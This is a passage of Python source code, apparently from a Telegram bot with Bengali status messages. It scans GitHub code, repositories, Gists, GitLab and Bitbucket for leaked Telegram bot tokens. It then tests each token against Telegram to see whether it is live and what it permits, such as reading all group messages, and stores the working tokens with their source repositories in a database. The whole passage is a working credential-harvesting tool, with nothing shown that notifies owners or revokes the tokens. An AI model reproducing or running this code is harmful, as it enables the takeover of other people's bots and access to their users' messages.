    sources_checked = 0
    
    # 1️⃣ GitHub Code Search
    bot.send_message(uid, "📡 *GitHub Code Search চলছে...*")
    github_results = search_github('telegram bot token', 30)
    sources_checked += 1
    
    for r in github_results:
        content = get_file_content(r['repo'], r['file'])
        if content:
            tokens = extract_tokens(content)
            for t in tokens:
                all_tokens.append({
                    'token': t,
                    'repo': r['repo'],
                    'repo_url': r['repo_url'],
                    'file': r['file'],
                    'source': 'GitHub'
                })
    
    # 2️⃣ GitHub Repo Search
    bot.send_message(uid, "📡 *GitHub Repository Scan চলছে...*")
    repo_tokens = search_repos_for_tokens(20)
    all_tokens.extend(repo_tokens)
    sources_checked += 1
    
    # 3️⃣ GitLab Search
    bot.send_message(uid, "📡 *GitLab Scan চলছে...*")
    gitlab_tokens = search_gitlab('telegram bot', 15)
    all_tokens.extend(gitlab_tokens)
    sources_checked += 1
    
    # 4️⃣ GitHub Gists
    bot.send_message(uid, "📡 *GitHub Gists Scan চলছে...*")
    gist_tokens = search_gists('telegram', 15)
    all_tokens.extend(gist_tokens)
    sources_checked += 1
    
    # 5️⃣ BitBucket
    try:
        bot.send_message(uid, "📡 *BitBucket Scan চলছে...*")
        bb_tokens = search_bitbucket('telegram', 10)
        all_tokens.extend(bb_tokens)
        sources_checked += 1
    except:
        pass
    
    # ইউনিক টোকেন
    unique_tokens = {}
    for item in all_tokens:
        t = item['token']
        if t not in unique_tokens:
            unique_tokens[t] = item
    
    # টেস্ট করে সেভ
    found_count = 0
    active_count = 0
    
    for token, info in unique_tokens.items():
        bot_info = test_token(token)
        
        conn = get_db()
        c = conn.cursor()
        
        try:
            c.execute("SELECT id FROM found_tokens WHERE token=?", (token,))
            existing = c.fetchone()
            
            if not existing:
                now = datetime.now().isoformat()
                c.execute("""INSERT INTO found_tokens 
                    (token, bot_username, bot_name, bot_id, is_active, source, repo_name, repo_url, file_name,
                     can_join_groups, can_read_all, supports_inline, has_commands, last_checked, found_date, status)
                    VALUES (?,?,?,?,?,?,?,?,?,?,?,?,?,?,?,?)""",
                    (token,
                     bot_info['username'] if bot_info else 'Unknown',
                     bot_info['name'] if bot_info else 'Unknown',
                     bot_info['id'] if bot_info else 0,
                     1 if bot_info else 0,
                     info['source'],
                     info['repo'],
                     info['repo_url'],
                     info['file'],
                     bot_info['can_join_groups'] if bot_info else 0,
                     bot_info['can_read_all'] if bot_info else 0,
                     bot_info['supports_inline'] if bot_info else 0,
                     bot_info['has_commands'] if bot_info else 0,
                     now, now,
                     'Active' if bot_info else 'Inactive'))
                
                found_count += 1
                if bot_info:
                    active_count += 1
        except:
            pass
        
        conn.commit()
        conn.close()
    
    duration = time.time() - start_time
    
    # স্ক্যান হিস্টোরি সেভ
    conn = get_db()
    c = conn.cursor()
    c.execute("""INSERT INTO scan_history (source, query, items_scanned, tokens_found, tokens_active, scan_date, duration_seconds)
                VALUES (?,?,?,?,?,?,?)""",
              ('All Sources', 'auto scan', len(unique_tokens), found_count, active_count, 
               datetime.now().isoformat(), duration))
    
    c.execute("UPDATE settings SET value=? WHERE key='last_scan'", (datetime.now().isoformat(),))
    c.execute("UPDATE settings SET value = CAST(CAST(value AS INTEGER) + 1 AS TEXT) WHERE key='total_scans'")
    c.execute("UPDATE settings SET value = CAST(CAST(value AS INTEGER) + ? AS TEXT) WHERE key='total_tokens_found'", (found_count,))
    
    conn.commit()
    conn.close()
    
    # রিপোর্ট
    report = (
        f"✅ *স্ক্যান সম্পন্ন!*\n\n"
